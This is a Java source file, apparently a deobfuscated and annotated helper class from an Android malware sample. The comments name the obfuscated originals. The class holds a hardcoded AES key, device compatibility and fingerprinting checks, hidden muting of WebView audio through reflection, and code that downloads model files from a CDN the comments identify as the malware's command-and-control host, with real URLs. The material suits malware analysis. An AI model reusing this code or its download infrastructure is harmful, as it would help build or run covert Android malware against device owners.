package core;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.SystemClock;
import android.util.Base64;
import android.webkit.WebView;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.Locale;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * PreferencesHelper — 偏好设置 / 加密 / 设备兼容性工具
 *
 * Original: IlIlIIIlIlIlll1.IIlIllIIll1
 *
 * Comprehensive utility class used by the malware for:
 *   1. SharedPreferences read/write (encrypted key-value store)
 *   2. AES encryption/decryption of data written to local files
 *   3. File copy operations
 *   4. Device compatibility checks (WebRTC, WebView, SDK version, CPU cores)
 *   5. AI model file download from C&C CDN
 *   6. WebView audio muting via reflection
 *   7. User-Agent string generation
 *   8. MD5 hashing
 *   9. Class existence checks
 *
 * ┌──────────────────────────────────────────────────────────────────┐
 * │ Constants                                                        │
 * ├──────────────────────────────────────────────────────────────────┤
 * │ PREFS_VERSION = 106                                              │
 * │ MIN_SDK_VERSION_OFFSET = 3                                       │
 * │ PREFS_NAME = "jsbi_h5o"                                         │
 * │ AES_KEY_B64 = "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="  │
 * │ AES_ALGORITHM = "AES"                                            │
 * │ DEBUG_TAG = "dllpdg_debug"                                       │
 * │ AI_MODEL_FILE = "new_h5core_106.tflite"                         │
 * │ PREF_KEY_LAST_OFFER = "LastOfferTimeKey"                        │
 * │ PREF_KEY_FIRST_INIT = "IsFirstInitKey"                          │
 * │ PREF_KEY_UUID = "uuid"                                           │
 * │ PREF_KEY_JS_MODEL_VER = "js_model_ver"                          │
 * └──────────────────────────────────────────────────────────────────┘
 *
 * AI Model CDN URLs (ufileos.com):
 *   - https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/best-v6-fp16.tflite
 *   - https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/js_v3/model.json
 *   - https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/js_v3/group1-shard1of2.bin
 *   - https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/js_v3/group1-shard2of2.bin
 */
public class PreferencesHelper {

    // =========================================================================
    // Constants
    // =========================================================================

    /** Preferences/protocol version number */
    public static final int PREFS_VERSION = 106;                        /* f143lIIIIlllllIlll1 */

    /** Minimum SDK version offset (used with sdkCheck) */
    public static final int MIN_SDK_VERSION_OFFSET = 3;                 /* f144lIllIIIlIl1 */

    /** SharedPreferences file name */
    public static final String PREFS_NAME = "jsbi_h5o";                 /* f147llllIIIIll1 */

    /** AES encryption key (Base64-encoded) */
    public static final String AES_KEY_B64 =
            "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI=";            /* f139IlIllIlllIllI1 */

    /** AES algorithm identifier */
    public static final String AES_ALGORITHM = "AES";                   /* f140IlIlllIIlI1 */

    /** Debug log tag */
    public static final String DEBUG_TAG = "dllpdg_debug";              /* f142IllIIlIIII1 */

    /** AI model local file name */
    public static final String AI_MODEL_FILE = "new_h5core_106.tflite"; /* f150llllllIlIIIlll1 */

    /** Preference key: last offer timestamp */
    public static final String PREF_KEY_LAST_OFFER = "LastOfferTimeKey"; /* f138IlIlIIlIII1 */

    /** Preference key: first initialization flag */
    public static final String PREF_KEY_FIRST_INIT = "IsFirstInitKey";  /* f135IIlIllIIll1 */

    /** Preference key: device UUID */
    public static final String PREF_KEY_UUID = "uuid";                  /* f136IlIIlllllI1 */

    /** Preference key: JS model version */
    public static final String PREF_KEY_JS_MODEL_VER = "js_model_ver";  /* f137IlIlIIIlIlIlll1 */

    // AI Model CDN URLs
    private static final String AI_MODEL_URL_TFLITE =
            "https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/best-v6-fp16.tflite";
    private static final String AI_MODEL_URL_JSON =
            "https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/js_v3/model.json";
    private static final String AI_MODEL_URL_SHARD1 =
            "https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/js_v3/group1-shard1of2.bin";
    private static final String AI_MODEL_URL_SHARD2 =
            "https://app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/js_v3/group1-shard2of2.bin";

    private static final String AI_MODEL_LOCAL_TFLITE = "best-v6-fp16.tflite";
    private static final String AI_MODEL_LOCAL_JSON = "js_v3/model.json";
    private static final String AI_MODEL_LOCAL_SHARD1 = "js_v3/group1-shard1of2.bin";
    private static final String AI_MODEL_LOCAL_SHARD2 = "js_v3/group1-shard2of2.bin";

    // =========================================================================
    // Mutable state
    // =========================================================================

    /** Download counter / status: -1 = not started */
    public static int downloadStatus = -1;                              /* f146llIIIIlIlllIII1 */

    /** Cached context reference */
    public static Context cachedContext = null;                         /* f145lIllIlIll1 */

    // =========================================================================
    // AI Model Download Runnables (3 parallel download tasks)
    // =========================================================================

    /**
     * Downloads TFLITE model file from CDN.
     * Original inner class: llllIIIIll1 (Runnable)
     */
    public class TfliteModelDownloader implements Runnable {
        private final Exception[] errorHolder;
        private final CountDownLatch latch;

        public TfliteModelDownloader(Exception[] errorHolder, CountDownLatch latch) {
            this.errorHolder = errorHolder;
            this.latch = latch;
        }

        @Override
        public void run() {
            try {
                try {
                    Context context = AppContext.getContext();
                    FileHelper.downloadToFile(context, AI_MODEL_URL_TFLITE, AI_MODEL_LOCAL_TFLITE);
                } catch (IOException e) {
                    LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                            "AI model download failed (tflite): " + e.getMessage()
                            + " — please check network, retry next cycle");
                    errorHolder[0] = e;
                }
            } finally {
                latch.countDown();
            }
        }
    }

    /**
     * Downloads JS model JSON + shard1 from CDN.
     * Original inner class: lIIIIlllllIlll1 (Runnable)
     */
    public class JsonModelDownloader implements Runnable {
        private final Exception[] errorHolder;
        private final CountDownLatch latch;

        public JsonModelDownloader(Exception[] errorHolder, CountDownLatch latch) {
            this.errorHolder = errorHolder;
            this.latch = latch;
        }

        @Override
        public void run() {
            try {
                try {
                    Context context = AppContext.getContext();
                    FileHelper.downloadToFile(context, AI_MODEL_URL_JSON, AI_MODEL_LOCAL_JSON);
                } catch (IOException e) {
                    LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                            "AI model download failed (json): " + e.getMessage()
                            + " — please check network, retry next cycle");
                    errorHolder[0] = e;
                }
            } finally {
                latch.countDown();
            }
        }
    }

    /**
     * Downloads shard model files from CDN.
     * Original inner class: llllIllIl1 (Runnable)
     */
    public class ShardModelDownloader implements Runnable {
        private final Exception[] errorHolder;
        private final CountDownLatch latch;

        public ShardModelDownloader(Exception[] errorHolder, CountDownLatch latch) {
            this.errorHolder = errorHolder;
            this.latch = latch;
        }

        @Override
        public void run() {
            try {
                try {
                    Context context = AppContext.getContext();
                    FileHelper.downloadToFile(context,
                            AI_MODEL_URL_SHARD1 + "," + AI_MODEL_URL_SHARD2,
                            AI_MODEL_LOCAL_SHARD1 + "," + AI_MODEL_LOCAL_SHARD2);
                } catch (IOException e) {
                    LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                            "AI model download failed (shard): " + e.getMessage()
                            + " — please check network, retry next cycle");
                    errorHolder[0] = e;
                }
            } finally {
                latch.countDown();
            }
        }
    }

    // =========================================================================
    // Device Compatibility Checks
    // =========================================================================

    /**
     * Checks if all requirements are met for the malware to operate:
     * WebRTC availability, WebView audio mute support, SDK version >= 33, CPU cores >= 4.
     *
     * Original: llllIllIl1()
     * @return true if device is compatible
     */
    public static boolean isDeviceCompatible() {
        if (!isWebRTCAvailable() || !isWebViewMuteSupported()
                || !isSdkVersionAtLeast(13) || Runtime.getRuntime().availableProcessors() < 4) {
            return false;
        }
        LogHelper.log(LogHelper.LogLevel.INFO, DEBUG_TAG,
                "Device compatibility check passed");
        return true;
    }

    /**
     * Checks if the download has already been completed (version 3 stored in prefs).
     *
     * Original: IIlIllIIll1()
     * @return true if should skip download
     */
    public static boolean isDownloadCompleted() {
        return downloadStatus < 0 && classExists(PREF_KEY_JS_MODEL_VER);
    }

    /**
     * Checks if WebRTC classes are available on device.
     *
     * Original: lIllIIIlIl1()
     * @return true if org.webrtc.PeerConnectionFactory is loadable
     */
    public static boolean isWebRTCAvailable() {
        try {
            Class.forName("org.webrtc.PeerConnectionFactory");
            return true;
        } catch (ClassNotFoundException unused) {
            LogHelper.log(LogHelper.LogLevel.ERROR, "",
                    "WebRTC not available on device");
            return false;
        }
    }

    /**
     * Checks if WebView audio muting is supported via AndroidX.
     *
     * Original: IlIllll1()
     * @return true if supported
     */
    public static boolean isWebViewMuteSupported() {
        boolean hasWebViewCompat;
        boolean hasWebViewFeature;
        boolean hasEglBase;
        try {
            try {
                Class.forName("androidx.webkit.WebViewCompat")
                        .getDeclaredMethod("isFeatureSupported", (Class<?>[]) null);
                hasWebViewCompat = true;
            } catch (Exception unused) {
                hasWebViewCompat = false;
            }
            try {
                Class.forName("androidx.webkit.WebViewFeature")
                        .getDeclaredMethod("MUTE_AUDIO", (Class<?>[]) null);
                hasWebViewFeature = true;
            } catch (Exception unused2) {
                hasWebViewFeature = false;
            }
            try {
                Class.forName("org.webrtc.EglBase")
                        .getDeclaredMethod("create", (Class<?>[]) null);
                hasEglBase = true;
            } catch (Exception unused3) {
                hasEglBase = false;
            }
            return hasWebViewCompat || hasWebViewFeature || hasEglBase;
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "Error checking WebView mute: " + e);
            return false;
        }
    }

    /**
     * Checks if WebRTC EglBase classes exist.
     *
     * Original: lllllIllIl1()
     * @return true if both EglBase and EglBase$-CC / EglBase$CC exist
     */
    public static boolean isEglBaseAvailable() {
        try {
            Class.forName("org.webrtc.EglBase$-CC");
            Class.forName("org.webrtc.EglBase$CC");
            return true;
        } catch (ClassNotFoundException unused) {
            return false;
        }
    }

    /**
     * Checks if the Android SDK version is at least (offset + 20).
     *
     * Original: llllIIIIll1(int i)
     * @param offset the offset to add to 20
     * @return true if Build.VERSION.SDK_INT >= offset + 20
     */
    public static boolean isSdkVersionAtLeast(int offset) {
        return Build.VERSION.SDK_INT >= offset + 20;
    }

    /**
     * Returns the number of available CPU cores.
     *
     * Original: IlIllIlllIllI1()
     */
    public static int getAvailableProcessors() {
        return Runtime.getRuntime().availableProcessors();
    }

    // =========================================================================
    // User-Agent / Device Info
    // =========================================================================

    /**
     * Builds a custom User-Agent string with device info.
     * Format: "MyApp/1.0 (Linux; Android {version}; {model}) DPI/{dpi}"
     *
     * Original: IlIlIIlIII1()
     * @return user-agent string
     */
    public static String buildUserAgent() {
        String model = Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        int dpi = AppContext.getContext().getResources().getDisplayMetrics().densityDpi;
        return "MyApp" + "/" + "1.0" + " (Linux; Android " + androidVersion
                + "; " + model + ") DPI/" + dpi;
    }

    // =========================================================================
    // SharedPreferences Operations
    // =========================================================================

    /**
     * Reads a string value from SharedPreferences.
     *
     * Original: llllIIIIll1(Context context, String str)
     * @param context the app context
     * @param key     the preference key
     * @return the stored value, or null if not found
     */
    public static String getString(Context context, String key) {
        return context.getSharedPreferences(PREFS_NAME, 0).getString(key, null);
    }

    /**
     * Writes a string value to SharedPreferences.
     *
     * Original: lIIIIlllllIlll1(Context context, String str, String str2)
     * @param context the app context
     * @param key     the preference key
     * @param value   the value to store
     */
    public static void putString(Context context, String key, String value) {
        SharedPreferences.Editor edit = context.getSharedPreferences(PREFS_NAME, 0).edit();
        edit.putString(key, value);
        edit.apply();
    }

    /**
     * Gets or generates a unique device ID (UUID without dashes).
     *
     * Original: lIIIIlllllIlll1(Context context)
     * @param context the app context
     * @return unique device identifier
     */
    public static String getOrCreateDeviceId(Context context) {
        String deviceId = getString(context, PREF_KEY_UUID);
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = UUID.randomUUID().toString().replace("-", "");
        }
        SharedPreferences.Editor edit = context.getSharedPreferences(PREFS_NAME, 0).edit();
        edit.putString(PREF_KEY_UUID, deviceId);
        edit.apply();
        return deviceId;
    }

    /**
     * Checks if the download has already been completed (pref value == "3").
     *
     * Original: lIIIIlllllIlll1()
     * @return true if marked as completed
     */
    public static boolean isModelDownloadComplete() {
        String value = getString(AppContext.getContext(), PREF_KEY_FIRST_INIT);
        return value != null && value.equals(String.valueOf(3));
    }

    /**
     * Gets the app version name.
     *
     * Original: llllIIIIll1(Context context) [returns String]
     * @param context the app context
     * @return version name string
     */
    public static String getAppVersionName(Context context) {
        try {
            return context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "";
        }
    }

    // =========================================================================
    // AES Encryption / Decryption
    // =========================================================================

    /**
     * Encrypts a string using AES with the hardcoded key.
     *
     * Original: llllIllIl1(String str) [encrypt]
     * @param plaintext the plaintext to encrypt
     * @return Base64-encoded ciphertext, or original string on error
     */
    public static String encrypt(String plaintext) {
        try {
            byte[] keyBytes = Base64.decode(AES_KEY_B64, Base64.NO_WRAP);
            SecretKeySpec keySpec = new SecretKeySpec(keyBytes, AES_ALGORITHM);
            Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);
            return Base64.encodeToString(cipher.doFinal(plaintext.getBytes()), Base64.DEFAULT);
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "Encryption failed: " + e);
            return plaintext;
        }
    }

    /**
     * Decrypts a Base64-encoded AES ciphertext.
     *
     * Original: lIIIIlllllIlll1(String str) [decrypt]
     * @param ciphertext the Base64-encoded ciphertext
     * @return decrypted plaintext, or empty string on error
     */
    public static String decrypt(String ciphertext) {
        try {
            byte[] keyBytes = Base64.decode(AES_KEY_B64, Base64.NO_WRAP);
            SecretKeySpec keySpec = new SecretKeySpec(keyBytes, AES_ALGORITHM);
            Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            return new String(cipher.doFinal(Base64.decode(ciphertext, Base64.DEFAULT)));
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "Decryption failed: " + e);
            return "";
        }
    }

    // =========================================================================
    // Encrypted File I/O
    // =========================================================================

    /**
     * Writes encrypted data to a file in the app's files directory.
     *
     * Original: llllIllIl1(Context context, String str, String str2) [write]
     * @param context  the app context
     * @param fileName file name (relative to filesDir)
     * @param data     plaintext data to encrypt and write
     * @return true if successful
     */
    public static boolean writeEncryptedFile(Context context, String fileName, String data) {
        try {
            File file = new File(context.getFilesDir(), fileName);
            if (!file.exists()) {
                if (file.getParentFile() != null) {
                    file.getParentFile().mkdirs();
                }
                file.createNewFile();
            }
            String encrypted = encrypt(data);
            FileOutputStream fos = new FileOutputStream(file);
            try {
                fos.write(encrypted.getBytes());
                fos.close();
                return true;
            } finally {
                fos.close();
            }
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "Write encrypted file failed: " + e);
            return false;
        }
    }

    /**
     * Reads and decrypts data from a file in the app's files directory.
     *
     * Original: lIIIIlllllIlll1(Context context, String str) [read]
     * @param context  the app context
     * @param fileName file name (relative to filesDir)
     * @return decrypted content, or null on error
     */
    public static String readEncryptedFile(Context context, String fileName) {
        try {
            File file = new File(context.getFilesDir(), fileName);
            if (file.exists() && file.isFile()) {
                FileInputStream fis = new FileInputStream(file);
                try {
                    StringBuilder sb = new StringBuilder();
                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = fis.read(buffer)) != -1) {
                        sb.append(new String(buffer, 0, read));
                    }
                    String content = sb.toString();
                    fis.close();
                    return decrypt(content);
                } finally {
                    fis.close();
                }
            }
            return null;
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "Read encrypted file failed: " + e);
            return null;
        }
    }

    // =========================================================================
    // File Copy Operations
    // =========================================================================

    /**
     * Copies a file (by File objects).
     *
     * Original: llllIIIIll1(File file, File file2)
     * @param src  source file
     * @param dest destination file
     */
    public static void copyFile(File src, File dest) {
        if (dest.getParentFile() != null) {
            dest.getParentFile().mkdirs();
        }
        try {
            FileInputStream fis = new FileInputStream(src);
            try {
                FileOutputStream fos = new FileOutputStream(dest);
                try {
                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = fis.read(buffer)) > 0) {
                        fos.write(buffer, 0, read);
                    }
                    fos.close();
                    fis.close();
                } finally {
                    fos.close();
                }
            } finally {
                fis.close();
            }
        } catch (IOException e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "File copy failed: " + e.getMessage());
        }
    }

    /**
     * Copies a file within the app's filesDir (by relative paths).
     *
     * Original: llllIIIIll1(Context context, String str, String str2) [copy]
     * @param context  the app context
     * @param srcName  source file name
     * @param destName destination file name
     * @return true if successful
     */
    public static boolean copyFileInFilesDir(Context context, String srcName, String destName) {
        try {
            File src = new File(context.getFilesDir(), srcName);
            File dest = new File(context.getFilesDir(), destName);
            if (src.exists() && src.isFile()) {
                if (!dest.exists()) {
                    if (dest.getParentFile() != null) {
                        dest.getParentFile().mkdirs();
                    }
                    dest.createNewFile();
                }
                FileInputStream fis = new FileInputStream(src);
                try {
                    FileOutputStream fos = new FileOutputStream(dest);
                    try {
                        byte[] buffer = new byte[1024];
                        int read;
                        while ((read = fis.read(buffer)) != -1) {
                            fos.write(buffer, 0, read);
                        }
                        fos.close();
                        fis.close();
                        return true;
                    } finally {
                        fos.close();
                    }
                } finally {
                    fis.close();
                }
            }
            return false;
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "File copy in filesDir failed: " + e);
            return false;
        }
    }

    // =========================================================================
    // File / Class Checks
    // =========================================================================

    /**
     * Checks if a file exists in java.io.tmpdir.
     *
     * Original: IllIIlIIII1(String str)
     * @param fileName the file name
     * @return true if file exists
     */
    public static boolean fileExistsInTmpDir(String fileName) {
        File tmpDir = getTmpDir();
        if (fileName == null) return false;
        File file = new File(tmpDir, fileName);
        return file.exists() && file.isFile();
    }

    /**
     * Gets the java.io.tmpdir directory.
     *
     * Original: IlIlllIIlI1()
     * @return File pointing to java.io.tmpdir
     */
    public static File getTmpDir() {
        return new File((String) Objects.requireNonNull(System.getProperty("java.io.tmpdir")));
    }

    /**
     * Gets the malware's local data directory.
     *
     * Original: llllllIlIIIlll1()
     * @return File pointing to filesDir/new_h5core_106.tflite
     */
    public static File getModelDir() {
        return new File(AppContext.getContext().getFilesDir(), AI_MODEL_FILE);
    }

    /**
     * Checks if a class exists (can be loaded).
     *
     * Original: llllIIIIll1(String str) [boolean]
     * @param className the fully-qualified class name
     * @return true if class can be loaded
     */
    public static boolean classExists(String className) {
        return findClass(className) != null;
    }

    /**
     * Tries to load a class by name.
     *
     * Original: IlIlllIIlI1(String str) [returns Class]
     * @param className the class name
     * @return the Class object, or null if not found
     */
    public static Class<?> findClass(String className) {
        try {
            return Class.forName(className);
        } catch (ClassNotFoundException e) {
            LogHelper.log(LogHelper.LogLevel.WARN, DEBUG_TAG,
                    "Class not found: " + className + " - " + e);
            return null;
        } catch (NoClassDefFoundError e) {
            LogHelper.log(LogHelper.LogLevel.WARN, DEBUG_TAG,
                    "Class def not found: " + className + " - " + e);
            return null;
        }
    }

    // =========================================================================
    // Hashing
    // =========================================================================

    /**
     * Computes the MD5 hash of a string (uppercase hex).
     *
     * Original: IlIllIlllIllI1(String str) [MD5]
     * @param input the input string
     * @return uppercase hex MD5 digest
     */
    public static String md5(String input) {
        try {
            byte[] digest = MessageDigest.getInstance("MD5").digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                String hex = Integer.toHexString(b & 0xFF);
                if (hex.length() == 1) {
                    sb.append('0');
                }
                sb.append(hex);
            }
            return sb.toString().toUpperCase(Locale.getDefault());
        } catch (Exception unused) {
            return "";
        }
    }

    // =========================================================================
    // Sleep / Delay
    // =========================================================================

    /**
     * Sleeps the current thread for the specified duration.
     *
     * Original: llllIIIIll1(long j)
     * @param millis sleep duration in milliseconds
     */
    public static void scheduleDelay(long millis) {
        try {
            SystemClock.sleep(millis);
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.ERROR, DEBUG_TAG,
                    "Sleep interrupted: " + e);
        }
    }

    // =========================================================================
    // WebView Audio Muting
    // =========================================================================

    /**
     * Mutes/unmutes a WebView's audio using AndroidX WebViewCompat reflection.
     *
     * Original: llllIIIIll1(WebView webView, boolean z)
     * @param webView the WebView to mute
     * @param mute    true to mute, false to unmute
     * @return true if successful
     */
    public static boolean setWebViewAudioMuted(WebView webView, boolean mute) {
        try {
            Class<?> webViewFeatureClass = Class.forName(
                    "androidx.webkit.WebViewFeature");
            Class<?> webViewCompatClass = Class.forName(
                    "androidx.webkit.WebViewCompat");
            Object supported = webViewFeatureClass
                    .getMethod("isFeatureSupported", String.class)
                    .invoke(null, "MUTE_AUDIO");
            if ((supported instanceof Boolean) && ((Boolean) supported)) {
                webViewCompatClass
                        .getMethod("setAudioMuted", WebView.class, Boolean.TYPE)
                        .invoke(null, webView, mute);
                return true;
            }
        } catch (Exception e) {
            LogHelper.log(LogHelper.LogLevel.WARN, DEBUG_TAG,
                    "WebView audio mute failed (feature not supported): " + e);
        }
        return false;
    }

    // =========================================================================
    // AI Model Download
    // =========================================================================

    /**
     * Downloads AI model files from CDN in parallel (3 threads).
     * Marks download as complete (version=3) in SharedPreferences.
     *
     * If already downloaded (isModelDownloadComplete()), skips.
     *
     * Original: llllIIIIll1() [void, no args]
     */
    public static void downloadAIModels() {
        if (isModelDownloadComplete()) {
            LogHelper.log(LogHelper.LogLevel.INFO, DEBUG_TAG,
                    "AI model already downloaded, skipping re-download");
            return;
        }

        LogHelper.log(LogHelper.LogLevel.INFO, DEBUG_TAG,
                "Starting AI model download (3 parallel threads)...");

        ExecutorService pool = Executors.newFixedThreadPool(3);
        CountDownLatch latch = new CountDownLatch(3);
        Exception[] error = new Exception[1];

        PreferencesHelper helper = new PreferencesHelper();
        pool.execute(helper.new TfliteModelDownloader(error, latch));
        pool.execute(helper.new JsonModelDownloader(error, latch));
        pool.execute(helper.new ShardModelDownloader(error, latch));

        if (error[0] != null) {
            return;
        }

        try {
            try {
                latch.await();
                putString(AppContext.getContext(), PREF_KEY_FIRST_INIT, String.valueOf(3));
                LogHelper.log(LogHelper.LogLevel.INFO, DEBUG_TAG,
                        "AI model download complete");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        } finally {
            pool.shutdown();
        }
    }

    // =========================================================================
    // Misc
    // =========================================================================

    /**
     * Returns the cached context.
     *
     * Original: IllIIlIIII1()
     */
    public static Context getCachedContext() {
        return cachedContext;
    }

    /**
     * Parse a long from a string preference.
     *
     * Original: llllIllIl1(Context context) [returns long]
     */
    public static long parseLong(Context context) {
        try {
            return Long.parseLong(
                    String.valueOf(PREFS_VERSION).replace(".", ""));
        } catch (Exception unused) {
            return 0L;
        }
    }

    // =========================================================================
    // Placeholder types (see restored files for full implementations)
    // =========================================================================

    /*
     * AppContext → IlIlllIIlI1.lIIIIlllllIlll1
     *   - static Context getContext()
     *
     * LogHelper → lllllIllIl1.IllIIlIIII1
     *   - static void log(LogLevel, String tag, String message)
     *
     * FileHelper (static utility for URL → file download):
     *   - static void downloadToFile(Context ctx, String url, String localPath)
     *     (Original: IlIlIIIlIlIlll1.llllIllIl1.llllIIIIll1)
     */
}
